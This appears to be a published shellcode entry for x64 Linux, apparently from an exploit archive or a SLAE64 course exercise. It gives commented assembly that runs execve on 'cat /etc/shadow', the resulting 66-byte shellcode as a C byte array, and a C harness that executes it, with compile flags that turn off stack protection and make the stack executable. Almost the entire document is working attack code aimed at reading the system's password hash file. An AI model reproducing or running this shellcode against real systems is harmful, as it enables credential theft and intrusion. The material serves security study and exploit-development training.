# Exploit Title: Linux/x64 - execve "cat /etc/shadow" Shellcode (66 bytes)
# Date: 02-08-2021
# Author: Felipe Winsnes
# Tested on: Debian x64
# Shellcode Length: 66

/*
global _start

_start:

       xor rax, rax                   ; Zeroes out RAX.
       xor rbp, rbp                   ; Zeroes out RBP.

       push rax                       ; Pushes RAX's NULL-DWORD.

       mov rbp, 0x776f646168732f63    ; Moves value "wodahs/c" into RBP.
       push rbp                       ; Pushes the vaueof RBP into the Stack.

       mov rbp, 0x74652f2f2f2f2f2f    ; Moves value "te//////" into RBP.
       push rbp                       ; Pushes the vaue of RBP into the Stack.

       mov rbp, rsp                   ; Copies the value of the Stack into RBP.
       push rax                       ; Pushes RAX's NULL-DWORD.

       mov rbx, 0x7461632f6e69622f    ; Moves value "tac/nib/" into RBX.
       push rbx                       ; Pushes the vaue of RBX into the Stack.

       mov rbx, rsp                   ; Copies the value of the Stack into RBX.

       mov rdi, rsp                   ; Copies the value of the Stack into RDI.
       push rax                       ; Pushes RAX's NULL-DWORD.

       mov rdx, rsp                   ; Copies the value of the Stack into RDX. As the previous DWORD was completely NULL, RDX is set to 0.

       push rbp                       ; Pushes the vaue of RBP into the Stack.
       push rbx                       ; Pushes the vaue of RBX into the Stack. The full string should be "cat /etc/shadow".

       mov rsi, rsp                   ; Copies this entire string from the Stack into RSI.

       push word 59                   ; Pushes the value 59 (syscall value for execve in the x64 format).
       pop ax                         ; Pops this value into AX so there are no NULLs.
       syscall                        ; The syscall is executed.
*/


/*
Usage:
whitecr0wz@SLAE64:~/assembly/execve/cat$ gcc cat_shadow.c -o cat_shadow -fno-stack-protector -z execstack -w
whitecr0wz@SLAE64:~/assembly/execve/cat$ ./cat_shadow
*/

#include <stdio.h>

unsigned char shellcode[] = \
"\x48\x31\xc0\x48\x31\xed\x50\x48\xbd\x63\x2f\x73\x68\x61\x64\x6f\x77\x55\x48\xbd\x2f\x2f\x2f\x2f\x2f\x2f\x65\x74\x55\x48\x89\xe5\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x63\x61\x74\x53\x48\x89\xe3\x48\x89\xe7\x50\x48\x89\xe2\x55\x53\x48\x89\xe6\x66\x6a\x3b\x66\x58\x0f\x05";

int main()
{

    int (*ret)() = (int(*)())shellcode;
    ret();
}